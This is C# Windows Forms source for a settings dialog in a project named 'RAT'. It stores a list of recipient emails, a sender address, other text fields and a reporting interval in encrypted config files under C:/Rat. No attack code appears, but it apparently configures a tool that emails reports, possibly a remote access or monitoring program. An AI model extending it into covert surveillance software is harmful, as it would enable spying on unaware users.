
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.AccessControl;



namespace RAT
{
    public partial class Ratsettings : Form
    {

        
        String recp;
        String recpath = "C:/Rat/rec.config";
        String settingspath = "C:/Rat/settings.config";


        public Ratsettings()
        {
            InitializeComponent();
            listView1.Columns.Add("Email Id");
            listView1.Columns[0].Width = 300;

            if (File.Exists(recpath))
            { 
            File.Encrypt(recpath);
            File.Decrypt(recpath);
            foreach (string line in File.ReadAllLines(recpath))
                listView1.Items.Add((line));
            }
            else
            {
                MessageBox.Show("Recipeints file not found");
            }

            if (File.Exists(settingspath) == true)
            {

                tfrom.Text = File.ReadLines(settingspath).Take(1).First();
                textBox2.Text = File.ReadLines(settingspath).Skip(1).Take(1).First();
                textBox3.Text = File.ReadLines(settingspath).Skip(2).Take(1).First();
                textBox4.Text = File.ReadLines(settingspath).Skip(3).Take(1).First();
                int value;
                int.TryParse(File.ReadLines(settingspath).Skip(4).Take(1).First(), out value);
                tinv.Value = value;
                
            }
            else
            {
                var filesettings = File.Create(settingspath);
                filesettings.Close();
            }
            
            

        }

        
        private void Ratsettings_Load(object sender, EventArgs e)
        {

        }

        private void Frm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.ExitThread();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

             recp = textBox1.Text;
            //StreamWriter file2 = new StreamWriter(recpath, append: true);
           // file2.WriteLine(recp);
            listView1.Items.Add(recp);
           // file2.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            int i = 0;
            
            
           for(i=0;i<listView1.SelectedItems.Count;i++)
            {
                listView1.SelectedItems[0].Remove();
            }
        }

        private void bSave_Click(object sender, EventArgs e)
        {
            
            //System.IO.File.WriteAllText(recpath, string.Empty);
            File.Delete(recpath);
            File.Delete(settingspath);
            var filesetting = File.Create(settingspath);
            filesetting.Close();
            var filerec = File.Create(recpath);
            filerec.Close();


            using (var tw = new StreamWriter(recpath))
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    tw.WriteLine(item.Text);
                    
                }
            }
            
            File.Encrypt(recpath);
            

            StreamWriter fsettings = new StreamWriter(settingspath, append: true);
           
            fsettings.WriteLine(tfrom.Text);
            fsettings.WriteLine(textBox2.Text);
            fsettings.WriteLine(textBox3.Text);
            fsettings.WriteLine(textBox4.Text);
            fsettings.WriteLine(tinv.Text);
            
            fsettings.Close();
            File.Encrypt(settingspath);


        }

       
    }
}
